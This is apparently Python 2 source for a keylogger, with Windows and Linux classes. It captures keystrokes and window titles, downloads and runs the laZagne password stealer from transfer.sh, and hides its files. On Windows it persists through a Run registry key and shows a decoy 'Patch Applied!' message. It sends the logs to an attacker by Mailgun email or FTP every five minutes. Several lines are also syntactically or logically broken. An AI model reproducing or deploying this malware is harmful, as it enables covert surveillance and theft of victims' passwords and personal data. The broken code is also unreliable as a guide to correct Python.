#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Author: Habbon
Date: 30/04/17
Github: https://github.com/GooogIe/
Desc: This is just the file containing the classes
      you should create a new one which
      creates an instance of the needed class 
      and start the logger
"""

import datetime		# Used to get current date(im lazy)
import threading	# Why not using some threads
import requests		# A lot of cool stuff can be done with this
import os		# Interface with the system
import sys		# ^ ^ ^
import time		# Some delays..
import urllib		# Fetch this laZagne
import subprocess	# Handle outputs
from ftplib import *	# Ftp lib
import StringIO		# I told you...i'm lazy

#Don't create .pyc
sys.dont_write_bytecode = True

# Linux Libs
if os.name == 'posix':
        import pyxhook
# Windows Libs
elif os.name == 'nt':
        import pythoncom
        import pyHook
	import ctypes

       
"""------Start Logger SuperClass------"""
# Superclass Logger
class Logger(object):
"""
This is the main class 
Contains all the methods (virtual and non)
needed for the keylogger to run.
Other classes are inherited from this one
"""
        # Constructor
        def __init__(self,method,sender,senderpass,receivers,logfile,ftphost = None,maxchar = 10,terminatekey = 201):
                self.logfile = logfile									# Directory of the file with the logs
                self.logs = ""										# Logs variable
                self.terminatekey = terminatekey 							# Kill the process when pressed ( By default f12 )
                self.lastWindow = None									# Save the latest window where the user typed something
                self.sender = sender									# Credentials, depends on the method..
                self.senderpass = senderpass								# Credentials, depends on the method..
                self.receivers = receivers								# Recipents list
		self.running = True									# Variable which handle the running loop
		self.ftphost = ftphost
		self.method = method									# Tells how to send data 0 = Email 1 = Ftp
                self.threadSender = threading.Thread(name="sen",target=self.sendLogs)			# Thread which sends logs every 5 mins
                self.threadSender.daemon = True								# Setting it as a demon
                self.threadPasswords = threading.Thread(name="psw",target=self.stealCachedPasswords)	# Thread which executes laZagne
                self.threadPasswords.daemon = True

        # Virtual method used for starting the process
        def startLogging(self):
                raise NotImplementedError
               
        # Virtual method used for stopping the process
        def stopLogging(self):
                raise NotImplementedError
               
        # Virtual method used for creating logs file
        def createLogFile(self):
                raise NotImplementedError
       
        # Virtual method used for making the logger persistent
        def makeItPersist(self):
                raise NotImplementedError

	# Virtual method used for stealing passwords with laZagne
	def stealCachedPasswords(self):
		raise NotImplementedError
	
	# Virtual method used for downloading laZagne
	def downloadLaZagne(self):
		try:
			if os.name == "posix":										# If on linux
				urllib.urlretrieve ("https://transfer.sh/6HCqK/e", os.getcwd()+"/.laZagne")
				os.system("chmod +x "+os.getcwd()+"/.laZagne")						# Chmod it
				return True
			else:
				tmp = os.getenv('TEMP')									# Directory TEMP
				urllib.urlretrieve ("https://transfer.sh/v3cDX/e.exe", tmp+"\laZagne.exe")	# Download n save in TEMP
				os.system("attrib +h "+tmp+"\laZagne.exe")						# Gave attribute HIDDEN
				return True
       		except:
			return False

	# Method used to send logs
	def sendLogs(self):
		while self.running:				# Until running variable it's true
                        time.sleep(300)				# Wait 5 mins
			if self.method == 0:
				self.sendLogEmail()
			elif self.method == 1:
				self.uploadLogs()
		return
	#Method used to Log in into ftp and upload logs
	def uploadLogs(self):
		ftp = FTP(self.ftphost)					
		ftp.login(self.sender,self.senderpass)
		ftp.cwd('/')
		if self.logs != "":
			try:
				ftp.storbinary('STOR ', StringIO.StringIO(self.logs))
				self.logs == ""				# Empty logs
			except:
				pass

        # Method used to send email with logs
        def sendLogEmail(self):
		try:
		    	a = requests.post(
			"https://api.mailgun.net/v3/"+self.senderpass+"/messages",
			auth=("api", self.sender),
			data={"from": "Toc Toc <mailgun@"+self.senderpass+">",
			      "to": self.receivers,
			      "subject": 'Logs ['+str(requests.get('https://api.ipify.org').text)+']',
			      "text": str(self.logs)})
			self.logs = ""
		except:
			pass
	# Method used to write data on file
	def writeToFile(self,towrite):
            try:
                   with open(self.logfile,"a") as logf:
                            logf.write(towrite)
                            self.logs += towrite
            except:
                   pass
   
        # Method called each time a key is pressed
        def KeyPressed(self,event):
            if event.WindowName != self.lastWindow:			# If the window name is different from the last one
                   towrite = "[Window: "+str(event.WindowName)+" - "+str(event.Window)+"]\n"+"[Key: "+str(event.Key)+" - "+str(event.Ascii)+" At: "+str(datetime.datetime.now())+"]\n"		# Build the log including window name
                   self.lastWindow = event.WindowName
            else:
                   towrite = "[Key: "+str(event.Key)+" - "+str(event.Ascii)+"]\n"
            
	    self.writeToFile(towrite)
            towrite = ""
            if event.Ascii == self.terminatekey or 0:
                self.stopLogging()
 
 
               
"""------End Logger SuperClass------"""
 
 
"""------Start Nt Logger SubClass------"""
class ntLogger(Logger):
"""
This is the windows class
Methods are overrided from the superclass
To specifically works on windows
"""
        # Constructor
        def __init__(self,method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201):
                Logger.__init__(method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201)	# superclass constructor
                self.hookman = pyHook.HookManager()
                self.hookman.KeyDown = self.KeyPressed
                self.hookman.HookKeyboard()
               
        # Defining method which create the log file
        def createLogFile(self):
		if not(os.path.isfile(self.logfile)):
		        try:
		                lfile = open(self.logfile,"w+")
		                lfile.close()
		                os.system('attrib +h '+self.logfile)
		        except:
		                sys.exit(0)
		else:
			pass
        # Defining method which make the keylogger persistent
        def makeItPersist(self):
                exec_name = os.path.split(sys.argv[0])[1
                try:
                        os.system("copy "+exec_name+" %userprofile%")
                        os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Donttouch /d %userprofile%\\"+exec_name)
                        os.system("attrib +h %userprofile%\\"+exec_name)
                except:
                        pass

        # Defining method which starts laZagne
	def stealCachedPasswords(self):
		if(os.path.isfile(os.getenv('TEMP')+"\laZagne.exe")):
			try:
				laZagne = subprocess.Popen(os.getenv('TEMP')+"\laZagne.exe all", shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout_value = laZagne.communicate()[0]
				self.writeToFile(stdout_value[509:])
			except:
				pass
		else:
			if self.downloadLaZagne():
				self.stealCachedPasswords()

        # Defining method which starts logging
        def startLogging(self):
                self.createLogFile()
		try:
                	self.threadSender.start()
		except:
			pass
		try:
                	self.threadPasswords.start()
		except:
			pass
		if(os.getcwd() != os.path.expanduser("~")):
			ctypes.windll.user32.MessageBoxW(0, u"Patch Applied!", u"Patcher", 0)
                self.makeItPersist()
                pythoncom.PumpMessages()			
               
        # Defining method which stops logging
        def stopLogging(self):
                self.threadSender.join()
		self.threadPasswords.join()
                os.remove(self.logfile)
		return

 
"""------End Nt Logger SubClass------"""
 
 
"""------Start Unix Logger SubClass------"""
class posixLogger(Logger):
"""
This is the posix class
Methods are overrided from the superclass
To specifically works on linux
"""
        # Constructor
        def __init__(self,method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201):
                Logger.__init__(self,method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201)
                self.hookman = pyxhook.HookManager()
                self.hookman.KeyDown = self.KeyPressed
                self.hookman.HookKeyboard()
                self.running = True
               
        def createLogFile(self):
		if not(os.path.isfile(self.logfile)):
		        try:
		                lfile = open(self.logfile,"w+")
		                lfile.close()
		        except:
		                sys.exit(0)
		else:
			pass

	def stealCachedPasswords(self):
		if(os.path.isfile(os.getcwd()+"/.laZagne")):
			try:
				laZagne = subprocess.Popen("./.laZagne all", shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout_value = laZagne.stdout.read() + laZagne.stderr.read()
				self.writeToFile(stdout_value[509:])
			except:
				pass
		else:
			if self.downloadLaZagne():
				self.stealCachedPasswords()
                       
        def startLogging(self):
                self.createLogFile()
                self.hookman.start()
		try:
                	self.threadSender.start()
		except:
			pass
		try:
                	self.threadPasswords.start()
		except:
			pass		
                while self.running:
                        time.sleep(0.1)
        
        def stopLogging(self):
                self.running = False
                self.hookman.cancel()
                self.threadSender.join()
		self.threadPasswords.join()
                os.remove(self.logfile)
		return
               
"""------End Unix Logger SubClass------""" 
 

